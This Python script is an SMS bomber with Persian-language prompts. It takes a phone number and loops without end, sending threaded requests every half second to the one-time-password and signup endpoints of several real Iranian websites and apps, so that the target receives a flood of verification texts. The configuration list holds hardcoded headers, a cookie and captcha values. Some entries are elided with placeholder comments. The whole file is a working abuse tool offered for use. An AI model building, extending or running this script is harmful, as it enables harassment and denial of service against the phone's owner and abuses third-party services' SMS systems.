import requests
import json
import time
import uuid
from threading import Thread
from datetime import datetime

def send_request(api_config, phone_number):
    url = api_config["url"]
    headers = api_config.get("headers", {})
    data = api_config.get("data", {})
    method = api_config.get("method", "POST")
    params = api_config.get("params", {})
    
    # Replace phone number in data, headers, params and URL
    replacements = {
        "PHONE_NUMBER": phone_number,
        "PHONE_NUMBER_NO_ZERO": phone_number[1:],  # Remove first zero
        "PHONE_NUMBER_INTERNATIONAL": f"+98{phone_number[1:]}"  # +98 format
    }
    
    def replace_values(obj):
        if isinstance(obj, dict):
            return {k: replace_values(v) for k, v in obj.items()}
        elif isinstance(obj, str):
            for key, value in replacements.items():
                obj = obj.replace(key, value)
            return obj
        elif isinstance(obj, list):
            return [replace_values(item) for item in obj]
        return obj
    
    # Apply replacements
    url = replace_values(url)
    headers = replace_values(headers)
    data = replace_values(data)
    params = replace_values(params)
    
    # Generate dynamic values
    if "SESSION_ID" in str(data) or "SESSION_ID" in str(headers):
        session_id = f"{str(uuid.uuid4())}--{str(uuid.uuid4())}"
        data = str(data).replace("SESSION_ID", session_id)
        headers = {k: v.replace("SESSION_ID", session_id) if isinstance(v, str) else v 
                  for k, v in headers.items()}
    
    if "TIMESTAMP" in str(data) or "TIMESTAMP" in str(headers):
        timestamp = str(int(time.time() * 1000))
        data = str(data).replace("TIMESTAMP", timestamp)
        headers = {k: v.replace("TIMESTAMP", timestamp) if isinstance(v, str) else v 
                  for k, v in headers.items()}
    
    if "USER_UNIQUE_ID" in str(data) or "USER_UNIQUE_ID" in str(headers):
        user_unique_id = str(uuid.uuid4())
        data = str(data).replace("USER_UNIQUE_ID", user_unique_id)
        headers = {k: v.replace("USER_UNIQUE_ID", user_unique_id) if isinstance(v, str) else v 
                  for k, v in headers.items()}
    
    # Convert back to dict if needed
    if isinstance(data, str) and data.startswith("{"):
        try:
            data = json.loads(data)
        except:
            pass
    
    try:
        if method.upper() == "POST":
            if isinstance(data, dict):
                response = requests.post(url, json=data, headers=headers, params=params)
            else:
                response = requests.post(url, data=data, headers=headers, params=params)
        elif method.upper() == "GET":
            response = requests.get(url, headers=headers, params=params)
        else:
            print(f"Unsupported method: {method}")
            return
        
        print(f"API: {url}")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:200]}...")  # Show first 200 characters
        print("-" * 80)
        
    except Exception as e:
        print(f"Error calling {url}: {str(e)}")
        print("-" * 80)

# API configurations
api_configs = [
    # Previous APIs...
    {
        "url": "https://api.digikala.com/v1/user/authenticate/",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": {"backUrl": "/profile/", "username": "PHONE_NUMBER", "otp_call": False, "hash": None}
    },
    {
        "url": "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {"mobile": "PHONE_NUMBER", "confirmTerms": True, "notRobot": False, "ValidationCodeCreateReason": 5, "OtpApp": 0, "deviceTypeCode": 7, "IsAppOnly": False}
    },
    # ... (all previous APIs remain the same)
    
    # New APIs added
    {
        "url": "https://accounts-api.tapsi.ir/api/v1/sso-user/auth",
        "headers": {
            "Content-Type": "application/json",
            "x-agent": "v2.2|accounts|WEB|1.1.0||undefined.undefined.undefined|||||||||||||||",
            "x-requested-with": "XMLHttpRequest",
            "origin": "https://accounts.tapsi.ir",
            "cookie": "monshiff=d6a74a7cc948a1653482e271c2fccb1c"
        },
        "data": {
            "session_id": "SESSION_ID",
            "selected_step_key": "PROMPT_FOR_PHONE_NUMBER"
        }
    },
    {
        "url": "https://haal.ir/api/v2/User/UserRegisterVerifyWeb",
        "headers": {
            "Content-Type": "application/json;charset=UTF-8",
            "PlatformName": "WebApplication",
            "DeviceId": "undefined",
            "Timestamp": "TIMESTAMP"
        },
        "data": {
            "UserName": "PHONE_NUMBER",
            "PlatformName": "WebApplication",
            "DeviceId": "undefined",
            "Email": ""
        }
    },
    {
        "url": "https://sandbox.sibirani.com/api/v1/user/invite",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": "username=PHONE_NUMBER"
    },
    {
        "url": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/",
        "headers": {
            "Content-Type": "application/json",
            "site": "behtarino",
            "origin": "https://behtarino.com"
        },
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "url": "https://api.sibapp.net/api/v1/action",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "Content-Length": "448"
        },
        "data": {
            "name": "phone_number_verify",
            "data": {
                "utm": {
                    "source": "google",
                    "medium": "organic",
                    "campaign": ""
                },
                "user_unique_id": "USER_UNIQUE_ID",
                "purchase_flow": "",
                "purchase_flow_version": "purchaseFlowABGroup",
                "package_a_b_group": None,
                "package_a_b_group_version": "packagesABGroupV11",
                "register_a_b_group": "c",
                "register_a_b_group_version": "registerABGroupV3"
            }
        }
    },
    {
        "url": "https://app.appleapps.ir/ajax-api/auth_check_mobile",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Encoding": "gzip"
        },
        "data": f"mobile=PHONE_NUMBER&auth-captcha-id=714737&auth-captcha=641985"
    },
    {
        "url": "https://api.achareh.co/v2/accounts/login/?web=true",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "client": "customer",
            "accept-language": "fa-ir"
        },
        "data": {"phone": "98PHONE_NUMBER_NO_ZERO"}
    },
    # ... (other previously defined APIs)
]

def main():
    # Get phone number from user
    phone_number = input("لطفاً شماره تلفن را وارد کنید (مثال: 09123456789): ").strip()
    
    if not phone_number.startswith('0') or len(phone_number) != 11:
        print("شماره تلفن معتبر نیست! باید با 0 شروع شود و 11 رقمی باشد.")
        return
    
    print(f"\nشروع ارسال درخواست‌ها برای شماره: {phone_number}")
    print("=" * 80)
    
    # Send requests continuously every 0.5 seconds
    while True:
        for config in api_configs:
            thread = Thread(target=send_request, args=(config, phone_number))
            thread.start()
            time.sleep(0.5)
        
        print("یک دور کامل ارسال شد. ادامه...")
        print("=" * 80)

if __name__ == "__main__":
    main()